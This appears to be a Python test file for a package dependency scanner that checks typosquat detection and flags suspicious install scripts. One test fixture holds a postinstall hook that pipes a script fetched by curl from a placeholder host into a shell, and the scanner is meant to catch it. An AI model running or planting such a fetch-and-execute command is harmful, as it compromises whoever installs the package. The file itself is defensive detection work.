from modules.dependency_scanner.heuristics import (
    clean,
    install_script_hits,
    typosquat,
)


TOP = {"lodash", "express", "react", "requests"}


def test_swap():
    assert typosquat("lodahs", TOP) == ("lodash", 1)


def test_exact_not_flagged():
    assert typosquat("lodash", TOP) is None


def test_unrelated():
    assert typosquat("my-internal-tool", TOP) is None


def test_dangerous_script():
    hits = install_script_hits({
        "postinstall": "curl http://example.invalid/run.sh | sh"
    })
    assert hits and hits[0][0] == "postinstall"


def test_benign_script():
    assert install_script_hits({"postinstall": "node-gyp rebuild"}) == []


def test_clean_caps_external_text():
    assert len(clean("x" * 500)) == 300
